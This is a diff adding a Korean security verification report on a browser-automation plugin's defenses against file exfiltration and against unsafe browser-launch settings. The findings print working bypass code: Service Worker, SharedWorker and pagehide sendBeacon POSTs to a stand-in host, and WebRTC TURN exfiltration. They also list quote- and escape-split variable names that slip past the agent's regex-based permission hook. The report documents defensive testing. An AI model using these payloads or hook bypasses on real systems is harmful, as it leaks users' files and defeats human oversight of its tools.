@@ -284,3 +284,128 @@ dogfood 명령 (지시 그대로, `MIS_STATE_HOME`은 임시, cwd는 빈 git 저
 - 저장소 변경은 이 절을 덧붙인 것뿐이다. 커밋하지 않았다. 임시 디렉터리는 저장소 밖에 만들었고 끝에 지웠다.
 
 ROUND2: DEFECTS FOUND
+
+## 3차 검증 (round 3)
+
+- 대상: 같은 worktree, 브랜치 `m8-wip`, HEAD `f9e3a1d` (수정 커밋 `c939b71`, `f9e3a1d`). 검증자는 구현에 관여하지 않았다. 아래 수치는 모두 직접 실행한 결과이고, 실행하지 않은 항목은 "미실행"으로 적었다.
+- 환경: macOS, 시스템 Chrome(headless), `--host-resolver-rules=MAP *.test 127.0.0.1`로 `shop.test`를 원격 호스트로 씀. 외부 네트워크 없음. "원격" 수신은 내가 띄운 로컬 서버가 `Host: shop.test`로 구분해 기록. WebRTC·호스트 매핑 실험은 이 기기의 비루프백 인터페이스 `10.10.77.78`에 띄운 수신기로 확인(패킷은 기기 밖으로 나가지 않음). 전용 `TMPDIR`·`MIS_STATE_HOME`·로그는 scratchpad `m8r3/` 아래.
+
+### 판정: **DEFECTS FOUND**
+
+R2-1의 정확한 재현(로컬 `file://` 폼 → 원격 action)은 막혔고, form/fetch/beacon/keepalive/ping/redirect/iframe/popup/전용 Worker 경로도 막힌다. 그러나 같은 위협(로컬 페이지 스크립트가 `--remote` 없이 붙인 파일을 원격으로 보냄)이 **Service Worker, SharedWorker, 다른 로컬 문서로의 이동, 그리고 에러 문구가 안내하는 복구 절차(`closetab`) 자체**로 새어 나간다 (R3-1, MEDIUM). 커밋 메시지의 "the hold lasts until the holding tab closes"와 "workers"를 막는다는 주석은 실측과 다르다.
+
+### 실행 명령과 수치
+
+| 항목 | 결과 |
+|---|---|
+| `npm test` 1회차 | tests 487 / pass 487 / fail 0 / skipped 0, 153 s |
+| `npm test` 2회차 | 487 / 487 / 0 / 0, 110 s. `not ok` 0건 (flake 없음) |
+| `claude plugin validate .` | `✔ Validation passed` |
+
+### R2-1 재현과 업로드 방어 공격 (과제 2)
+
+방법: 공격마다 데몬을 새로 띄우고(`browse stop`), `goto http://127.0.0.1:P/<공격>.html` → `upload '#f' secret.txt`(내용 `SECRET-TOKEN-42`, `--remote` 없음) → `click '#go'` → 2.5 s 대기 → 원격(`shop.test`)·UDP·TCP 수신 로그에서 비밀 문자열(원문 또는 hex) 검색. 페이지는 `FileReader`(`file.text()`)로 내용을 읽어 둔다.
+
+| 경로 | 결과 | 분류 |
+|---|---|---|
+| R2-1 정확한 재현 (`file://` 페이지, form action 원격) | upload 거부("the form sends the file to http://shop.test…"), `files.length` 0, 이후 click은 빈 파일(`filename=""`)만 전송. `--remote` 경로는 정상 | **고쳐짐** |
+| JS로 만든 form + `submit()` | 차단, click 실패(`blocked: POST …/up?jsform`), 수신 0 | 막힘 |
+| 업로드 뒤 `form.action` 변경 + `requestSubmit()` | 수신 0 (원격 요청이 생기지 않음) | 막힘 |
+| `navigator.sendBeacon` / `fetch(…, {keepalive:true})` | 차단, click 실패 | 막힘 |
+| 원격 iframe(업로드 전 로드)에 `postMessage` → iframe이 POST | 차단 | 막힘 |
+| form `target`=iframe, action 원격 | 차단 | 막힘 |
+| 전용 `Worker`의 fetch | 차단 | 막힘 |
+| **Service Worker** (로컬 `/sw.js`에 `postMessage` → SW가 원격 POST) | **유출** 3/3 (`POST /up?sw body=SECRET-TOKEN-42`), click은 성공으로 보고 | **구멍** (R3-1) |
+| **SharedWorker** (`port.postMessage` → 원격 POST) | **유출** 3/3, click 성공 | **구멍** (R3-1) |
+| `window.open(원격?d=hex)` | GET 차단·콘솔 기록, 수신 0 | 막힘 |
+| `window.open('/로컬')` + localStorage → 팝업이 원격 POST | 차단 (팝업도 잡힘) | 막힘 |
+| **보유 페이지가 다른 로컬 문서로 이동** (`sessionStorage`에 저장 후 `location='/sendls.html'` → 새 문서가 원격 POST) | **유출** 3/3, `Clicked #go → …/sendls.html` | **구멍** (R3-1) |
+| 같은 방식, 데이터를 URL 쿼리로 넘김 (`/sendq.html?d=hex` → 원격 POST `location.search`) | **유출** (`body=?d=5345…3432`) | **구멍** (R3-1) |
+| 로컬 302 → 원격 | 차단 (`chrome-error://`), 수신 0 | 막힘 |
+| meta refresh(로컬 페이지가 원격으로) | 수신 0 | 막힘 (관측상) |
+| `<a ping>` | 차단, click 실패 | 막힘 |
+| GET 쿼리 유출: `new Image().src`, CSS `<link>`, `EventSource` | 모두 차단·콘솔 기록만, 수신 0. 즉 FileReader→URL→GET 유출은 이 페이지가 보유 중인 동안은 불가 | 막힘 |
+| 50 ms 간격으로 계속 원격 POST 시도 | 차단 | 막힘 |
+| **`pagehide` 핸들러 + `closetab`** (에러 문구가 안내하는 복구: `newtab` → `closetab <보유 탭>`) | **유출** 3/3 (`sendBeacon`과 `keepalive fetch` 둘 다 `SECRET-TOKEN-42` 도착) | **구멍** (R3-1) |
+| `pagehide` 핸들러 + 에이전트의 `goto` 다른 로컬 페이지 | beacon은 차단되고 `goto`가 실패 보고. 그러나 `keepalive fetch`가 3회 중 1회 유출 (경합) | **구멍** (R3-1) |
+| WebSocket (`ws://shop.test/ws?d=hex`) | 핸드셰이크 도착, URL에 hex 비밀 | 기록된 한계 (PROGRESS RISKS) |
+| **WebRTC** (`RTCPeerConnection`, TURN `username`=파일 내용, 서버 `10.10.77.78`) | 401 응답 뒤 Allocate 재요청에 `USERNAME U-SECRET-TOKEN-42`가 UDP로 도착. STUN binding도 막히지 않음 | **기록 안 된 한계** (WebSocket과 같은 부류: Fetch에 보이지 않는 전송. R3-2) |
+| `<link rel=preconnect href=https://<hex>.shop.test:P>` (SNI) | TCP 수신 0 (관측 안 됨) | 미확인 |
+| `dns-prefetch`로 DNS 이름에 데이터 싣기 | 이 환경에서 DNS 질의를 관측할 수단이 없어 **미실행** | — |
+
+과차단 한계(파일 보유 탭이 열린 동안 원격 로드 차단)는 기록대로 동작했다(이미지·CSS GET이 막히고 콘솔에만 남고 명령은 성공).
+
+### R2-2 visual-verdict 실제 스크린샷 (과제 3)
+
+같은 HTML 대시보드 페이지를 `mis browse screenshot`(전체/viewport)로 찍어 `ref.png`와 비교. 기본 tolerance 16, threshold 90 (pass ≥ 90, revise ≥ 50, fail < 50).
+
+| 쌍 | 점수 | 판정 |
+|---|---|---|
+| 같은 페이지 | 100 | pass |
+| 1 px 점 추가 | 99 | pass |
+| 전체 2 px 아래로 | 98 | pass (offset dy 2) |
+| 전체 5 px 아래로 | 32 | fail |
+| 숫자 하나(12→15) | 86 | revise |
+| 버튼 색 | 76 | revise |
+| 줄 하나 추가 | 86 | revise |
+| 다른 페이지(로그인) | 0 | fail |
+| 빈 페이지 | 0 | fail |
+| 긴 페이지(2124 px) 전체 캡처, 위 여백 +2 px (높이 +4) | 98 | pass |
+| 같은 긴 페이지, 위 여백 +6 px (높이 +12) | 4 | fail |
+| 같은 긴 페이지, 글자 하나(0→O) | 98 | pass |
+
+R2-2의 1 px → 0 fail, 2 px 이동 → 37 fail은 고쳐졌다. 판정 구간도 대체로 상식에 맞는다. 단, 정렬 한도(3 px)를 넘는 순간 점수가 절벽처럼 떨어진다: 5 px 이동 32 fail, 긴 페이지 6 px 여백 변경 4 fail(높이 차가 2×maxShift를 넘어 정렬이 꺼짐). 레이아웃이 몇 px 밀린 것은 "revise"가 맞는 상황이라 `mis check`로 등록된 자동 검사에서는 거짓 fail이 날 수 있다 (R3-4, LOW). 긴 페이지에서는 글자 하나 바뀐 것이 98 pass이지만, 문구가 "점수는 보조, 모델이 판단"이라고 하므로 결함으로 세지 않는다. `tests/unit/png.test.mjs`는 `assert.equal(..., 99/98/100/0/90)`로 정확한 값을 단언한다 (R2-5의 단언 약화 해소).
+
+### R2-3 Chrome 플래그 필터와 guard (과제 4)
+
+`chromeArgs()` 직접 호출:
+- 거부됨: `--remote-debugging-port=0`, 대문자, 대시 1·3개, 값 뒤에 붙인 형태(`--host-resolver-rules=MAP * 1.2.3.4 --remote-debugging-port=0`), 따옴표 안(`--x="a --remote-debugging-port=0"`), 탭·줄바꿈 구분, `--disable-web-security=1`, `--user-data-dir`, `--remote-debugging-pipe`, em/en dash로 시작(“not a flag”).
+- 통과했지만 무해: `--remote‑debugging-port`(U+2011), `--disable_web_security` — Chrome이 스위치로 인식하지 않는 이름.
+- **통과하고 실제로 위험**: `--host-resolver-rules=MAP localhost <원격IP>`, `--ignore-certificate-errors`, `--no-sandbox`, `--unsafely-treat-insecure-origin-as-secure`, `--renderer-cmd-prefix`/`--browser-subprocess-path`/`--gpu-launcher`(임의 실행 파일). 주석은 "reroute traffic"을 막는다고 하지만 `proxy-*`만 막는다.
+- `MIS_BROWSER`/`MIS_BROWSER_EXE`가 래퍼 스크립트를 가리키면 필터는 아무 의미가 없다(래퍼가 아무 플래그나 붙임). 그래서 guard ask가 주된 통제다.
+
+guard(`scripts/guard.mjs`에 hook JSON):
+
+| 명령 | 결정 |
+|---|---|
+| `MIS_BROWSE_CHROME_ARGS='--x' … browse goto` / `export …; …` / `env MIS_BROWSER_EXE=… …` / 함수 경유 / `declare -x` / `browse status` | ask |
+| `env MIS_BROWSE_CHROME_""ARGS='…' … browse goto` | **allow** |
+| `export MIS_BROWSE_CHROME_ARG\S='…'; … browse goto` | **allow** |
+| `export 'MIS_BROWSER'=/tmp/w; … browse goto` | **allow** |
+| `env MIS_BROWSER$'_EXE'=/tmp/w … browse goto` | **allow** |
+| `printf -v MIS_BROWSE_CHROME_ARGS …; export …` / `read … <<<` | allow (런타임 생성, R2-4 부류) |
+
+위 allow 형태 넷은 bash에서 실제로 변수가 설정된다(`env | grep ^MIS_`로 확인). 검사는 명령 원문에 대한 정규식(`/\b(MIS_BROWSE_CHROME_ARGS|MIS_BROWSER|MIS_BROWSER_EXE)=/`)이라 따옴표·이스케이프로 쪼갠 이름을 놓친다. D5에서 `cdp` 검사는 따옴표 쪼개기를 ask로 잡았으므로, 이것은 R2-4(위치 인자 재조립·런타임 생성)와 다른 정적 구문이다.
+
+종단 확인: `env MIS_BROWSE_CHROME_""ARGS='--host-resolver-rules=MAP localhost 10.10.77.78' mis browse goto http://localhost:58232/` → guard allow → 실제로는 `10.10.77.78`의 서버 페이지가 열림 → `js 'localStorage.s'`가 `--remote` 없이 `LANSECRET` 반환 → `upload` + `click` → `secret.txt` 내용이 `10.10.77.78` 서버에 multipart로 도착. 즉 이 경로로 데몬의 "로컬" 판정(storage/js/eval/upload 게이트와 R2-1 차단) 전체가 무력화된다 (R3-3, LOW: 의도적으로 이름을 쪼개는 에이전트가 필요).
+
+### R2-5 / R2-6 (과제 5)
+
+- R2-5 **PASS**: Chrome 명령줄에 `--disable-site-isolation-trials`가 있고, 로컬 페이지 안의 `shop.test` iframe을 `frame '#rf'`로 고를 수 있다 → `js` 거부(`non-local page (http://shop.test:…)`), `--remote`면 실행, `frame main`으로 복귀. 통합 테스트의 iframe 단언은 무조건 실행된다(조건 분기 없음).
+- R2-6 **PASS**: `agents/implementer.md:13`이 함수 형태로 바뀜, `plugin-files.test.mjs`가 `agents/`도 검사, PROGRESS:143에 m9 ID 출처 주석.
+
+### 회귀 점검 (D0–D12 일부 직접, 나머지는 테스트 스위트)
+
+- D0: 원격 사이트가 만든 `blob:` 문서에서 `js` → `non-local page (http://shop.test:…)` 거부. PASS.
+- D2: Chrome·자식 프로세스 TCP LISTEN 0 (`lsof`). PASS.
+- D5: `mis` 함수 경유 `browse cdp`, `upload --remote`, `js --remote` → ask. PASS.
+- D6: back/forward/reload가 이동 후 URL 출력. PASS.
+- D10: `stop` 뒤 프로필 디렉터리 삭제. PASS.
+- 일반 localhost QA 흐름: `goto http://localhost…`, `snapshot -i`, `click @e1 && text`, `fill`/`press`/`screenshot`, `js`, `chain`, 로컬 `upload`, `visual-verdict`, `pdf` → guard 모두 allow, 실제 실행도 정상.
+- D1, D3, D4, D7, D8, D9, D11, D12는 이번 회차에 수동 재현하지 않았다 (`npm test` 487개 통과에 포함된 범위만 근거).
+
+### 새로 찾은 결함
+
+| ID | 심각도 | 내용 | 재현 | 위치 |
+|---|---|---|---|---|
+| R3-1 | **MEDIUM** | R2-1 차단의 우회. (a) Service Worker와 SharedWorker의 요청은 페이지 세션의 `Fetch.enable`에 잡히지 않는다(별도 target). 로컬 앱이 SW로 백그라운드 업로드하는 구성은 흔하다(Workbox background sync). (b) "보유" 판정은 탭의 **현재** 문서(loaderId/URL)만 본다. 보유 페이지가 storage나 URL에 내용을 담아 다른 로컬 문서로 이동하면 보유가 풀리고 그 문서가 원격으로 보낸다. 커밋의 "the hold lasts until the holding tab closes"는 사실이 아니다. (c) 에러 문구가 안내하는 복구(`closetab <보유 탭>`)가 그 탭의 `pagehide`/unload에서 나가는 beacon·keepalive를 통과시킨다 (3/3). 에이전트의 `goto`로 떠날 때도 keepalive가 경합으로 1/3 통과. | 페이지(`127.0.0.1`): `navigator.serviceWorker.register('/sw.js')`, 클릭 시 `ready.then(r=>r.active.postMessage(text))`, sw.js: `onmessage=e=>fetch('http://shop.test:P/up?sw',{method:'POST',body:e.data,mode:'no-cors'})` → `upload '#f' secret.txt` → `click '#go'` → `Clicked #go`, 서버에 `POST /up?sw body=SECRET-TOKEN-42`. SharedWorker도 같음. 이동: `sessionStorage.x=text; location='/sendls.html'`(그 페이지가 원격 POST). 복구: 페이지에 `addEventListener('pagehide',()=>navigator.sendBeacon(R+'/up',text))` → upload → `newtab …` → `closetab 1` → 도착 | `scripts/lib/browse/browser.mjs` `holdLocalOnly`/`holding`/`screen`/`popupAttached` (auto-attach filter가 `page`만), `actions.mjs` 에러 문구 |
+| R3-2 | LOW | WebRTC(STUN/TURN, 데이터 채널)는 Fetch에 보이지 않아 막히지 않는다. TURN `username`에 파일 내용을 실어 UDP로 보낼 수 있음을 실측. PROGRESS RISKS에는 WebSocket만 적혀 있다. | 위 표의 WebRTC 행 (`turn:10.10.77.78:<udp>`, `username:'U-'+text`) | PROGRESS RISKS (기록 누락), `browser.mjs` shortcut 주석 |
+| R3-3 | LOW | 브라우저 실행 override 검사가 원문 정규식이라 `env MIS_BROWSE_CHROME_""ARGS=…`, `export MIS_BROWSE_CHROME_ARG\S=…`, `export 'MIS_BROWSER'=…`, `env MIS_BROWSER$'_EXE'=…`를 allow한다. 그리고 거부 목록이 `--host-resolver-rules`(로컬 판정 무력화, 위 종단 재현), `--ignore-certificate-errors`, `--no-sandbox`, `--renderer-cmd-prefix`류를 통과시킨다. | 위 R2-3 절의 종단 확인 | `scripts/lib/policy.mjs browserLaunchOverride`, `scripts/lib/browse/chrome.mjs DENIED` |
+| R3-4 | LOW | visual-verdict 정렬 한도 절벽: 3 px를 넘는 전체 이동은 거의 0점(5 px 32 fail, 긴 페이지 6 px 여백 4 fail). | 위 R2-2 표 | `scripts/lib/png.mjs compareImages` (`maxShift = 3`, `loose`) |
+
+### 프로세스 정리
+
+- 내가 띄운 것만 PID로 정리: 공격 사이트 서버, UDP 수신기(`10.10.77.78`), LAN HTTP 서버, 브라우저 데몬(`browse stop`, 매 공격·마지막). m9 worktree의 프로세스는 건드리지 않았다.
+- 저장소 변경은 이 절을 덧붙인 것뿐이고 커밋하지 않았다. 검증 저장소·임시 파일은 scratchpad `m8r3/` 아래에만 만들었다.
+
+ROUND3: DEFECTS FOUND
